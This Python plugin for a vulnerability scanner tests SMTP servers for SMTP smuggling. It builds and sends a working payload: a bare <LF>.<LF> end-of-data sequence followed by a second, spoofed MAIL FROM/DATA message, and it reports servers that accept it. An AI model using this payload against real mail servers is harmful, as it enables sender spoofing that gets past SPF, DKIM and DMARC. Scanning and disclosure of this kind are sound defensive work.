"""
Plugin to detect SMTP Smuggling (Bypass Definitivo de SPF/DKIM)
CVSS: 9.3 (Critical)

Targets Corporate Email Infrastructure (Exchange, Postfix, Sendmail).
Exploits End-of-Data sequence parsing differences (<CR><LF>.<CR><LF> vs <LF>.<LF>)
to smuggle a secondary, spoofed email bypassing SPF/DKIM validation.
"""

import socket
import logging
from typing import Optional, Dict, Any

logger = logging.getLogger("Cascavel.Plugins.SMTPSmuggling")

def test_smtp_smuggling_sequence(target_ip: str, port: int = 25, timeout: int = 5) -> tuple[bool, str]:
    """
    Connects to the SMTP server and attempts to send a smuggled message
    using non-standard End-of-Data sequences.
    Returns (is_vulnerable, evidence).
    """
    # Using typical testing domains. In a real red-team scenario, 
    # these would be mapped to the target's actual domains.
    sender = "test@cascavel-scanner.local"
    recipient = "postmaster@cascavel-scanner.local"
    
    # The smuggling payload. We simulate the end of the first message
    # using <LF>.<LF> instead of <CR><LF>.<CR><LF>, followed by the smuggled message.
    # If the outbound server treats <LF>.<LF> as just text, but the inbound server
    # treats it as End-of-Data, the second message is smuggled.
    
    # Message 1 (Legitimate)
    msg1_data = (
        f"From: {sender}\r\n"
        f"To: {recipient}\r\n"
        "Subject: Legitimate Message\r\n"
        "\r\n"
        "This is the legitimate message body."
    )
    
    # The Smuggling Sequence: <LF>.<LF> or <CR>.<CR>
    smuggling_sequence = "\n.\n"
    
    # Message 2 (Smuggled / Spoofed)
    smuggled_data = (
        "mail FROM:<admin@cascavel-scanner.local>\r\n"
        f"rcpt TO:<{recipient}>\r\n"
        "data\r\n"
        "From: admin@cascavel-scanner.local\r\n"
        f"To: {recipient}\r\n"
        "Subject: Smuggled Admin Message\r\n"
        "\r\n"
        "This is the smuggled message, bypassing SPF/DKIM.\r\n"
        ".\r\n"
    )
    
    payload = msg1_data + smuggling_sequence + smuggled_data
    
    try:
        with socket.create_connection((target_ip, port), timeout=timeout) as sock:
            def recv_response():
                try:
                    return sock.recv(1024).decode('utf-8', errors='ignore')
                except socket.timeout:
                    return ""

            # 1. Receive Banner
            banner = recv_response()
            if not banner.startswith("220"):
                return False, ""

            # 2. Send EHLO
            sock.sendall(b"EHLO cascavel-scanner.local\r\n")
            ehlo_resp = recv_response()
            if not ehlo_resp.startswith("250"):
                return False, ""

            # 3. Send MAIL FROM
            sock.sendall(f"MAIL FROM:<{sender}>\r\n".encode())
            mail_resp = recv_response()
            if not mail_resp.startswith("250"):
                return False, ""

            # 4. Send RCPT TO
            sock.sendall(f"RCPT TO:<{recipient}>\r\n".encode())
            rcpt_resp = recv_response()
            if not rcpt_resp.startswith("250"):
                return False, ""

            # 5. Send DATA command
            sock.sendall(b"DATA\r\n")
            data_resp = recv_response()
            if not data_resp.startswith("354"):
                return False, ""

            # 6. Send the smuggling payload
            sock.sendall(payload.encode())
            
            # 7. Receive response for the payload
            # If the server is vulnerable, it might process the smuggled MAIL FROM
            # and return a 250 OK for the smuggled message, or process it silently.
            # We look for indications that the smuggled commands were parsed.
            final_resp = recv_response()
            
            # Strict validation: The server must accept the data.
            # If it throws a 500 error (unrecognized command) for the smuggled part,
            # it means the smuggling sequence failed and the commands were treated as body text.
            if "250" in final_resp and "500" not in final_resp and "502" not in final_resp:
                # To be absolutely sure, we send a QUIT. If we get a response, the connection is still alive,
                # meaning the server processed our sequence.
                sock.sendall(b"QUIT\r\n")
                quit_resp = recv_response()
                if "221" in quit_resp:
                     return True, f"Server accepted <LF>.<LF> end-of-data sequence. Final response: {final_resp.strip()}"

    except Exception as e:
        logger.debug(f"SMTP Smuggling check failed on {target_ip}:{port}: {e}")
        
    return False, ""


def run(target: str, ip: str, ports: list, banners: dict) -> Optional[Dict[str, Any]]:
    """
    Checks for SMTP Smuggling vulnerabilities.
    """
    vulnerability = "SMTP Smuggling (SPF/DKIM Bypass)"
    severity = "CRITICAL"
    description = (
        "The SMTP server is vulnerable to SMTP Smuggling. By exploiting discrepancies "
        "in how outbound and inbound servers parse the End-of-Data sequence "
        "(e.g., using <LF>.<LF> instead of <CR><LF>.<CR><LF>), an attacker can 'smuggle' "
        "a secondary email within the body of a legitimate one. This allows perfect "
        "email spoofing that entirely bypasses SPF, DKIM, and DMARC validations."
    )

    # Common SMTP ports
    smtp_ports = [25, 465, 587, 2525]
    open_smtp_ports = [p for p in ports if p in smtp_ports]
    
    if not open_smtp_ports:
        return None

    for port in open_smtp_ports:
        is_vuln, evidence = test_smtp_smuggling_sequence(ip, port)
        if is_vuln:
            return {
                "vulnerability": vulnerability,
                "severity": severity,
                "description": description,
                "endpoint": f"smtp://{target}:{port}",
                "evidence": evidence
            }

    return None
